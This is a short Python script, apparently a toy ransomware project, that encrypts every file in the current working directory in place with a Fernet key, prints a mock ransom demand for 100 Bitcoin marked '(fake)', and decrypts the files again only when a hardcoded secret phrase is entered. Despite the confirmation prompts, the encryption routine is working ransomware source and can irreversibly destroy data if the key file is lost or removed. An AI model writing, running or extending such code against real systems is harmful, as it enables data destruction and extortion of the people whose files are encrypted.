#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import sys

# lets find some files

def ransomware_encrypt():
    
    answer1 = input("Is your encrypt/decrypt file named 'ransomware.py'? (y/n)")

    if answer1 == "n" or answer1 == "N":
        print("Sorry, your encrypt/decrypt file must be named 'ransomware.py'.")
        sys.exit()

    elif answer1 == "y" or answer1 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    files = []

    for file in os.listdir():
            if file == "ransomware.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)


    answer2 = input("All the files that were just listed are going to be encrypted. Would you like to continue? (Remember, all the files that were listed are going to be encrypted.) (y/n)")

    if answer2 == "n" or answer2 == "N":
        print("If this message is played, you have to edit the source code of this package to exclude the important files from the encryption/decryption.")
        sys.exit()

    elif answer2 == "y" or answer2 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    
    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
            thekey.write(key)

    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_encrypted)
    print("All of your files have been encrypted!! Send me 100 Bitcoin or i will delete your files in 24 hrs! (fake)")


def ransomware_decrypt():

    answer1 = input("Is your encrypt/decrypt file named 'ransomware.py'? (y/n)")

    if answer1 == "n" or answer1 == "N":
        print("Sorry, your encrypt file must be named 'ransomware.py'.")
        sys.exit()

    elif answer1 == "y" or answer1 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    files = []

    for file in os.listdir():
            if file == "ransomware.py" or file == "thekey.key":
                    continue
            if os.path.isfile(file):
                    files.append(file)

    print(files)

    answer2 = input("All the files that were just listed are going to be decrypted. Your code will break if you continue. Would you like to continue? (y/n)")

    if answer2 == "n" or answer2 == "N":
        print("If this message is played, you have to edit the source code of this package to exclude the important files from the encryption/decryption.")
        sys.exit()

    elif answer2 == "y" or answer2 == "Y":
        pass

    else:
        print("Invalid Input")
        sys.exit()

    with open("thekey.key", "rb") as key:
            secretkey = key.read()

    secretphrase = "gryffindor"

    user_phrase = input("Enter the secret phrase to decrypt your files\n")

    if user_phrase == secretphrase:
            for file in files:
                    with open(file, "rb") as thefile:
                            contents = thefile.read()
                    contents_decrypted = Fernet(secretkey).decrypt(contents)
                    with open(file, "wb") as thefile:
                            thefile.write(contents_decrypted)
                    print("congrats, your files are decrypted. Have fun!")
    else:
            print("Sorry, wrong secret phrase. Send me more bitcoin.")
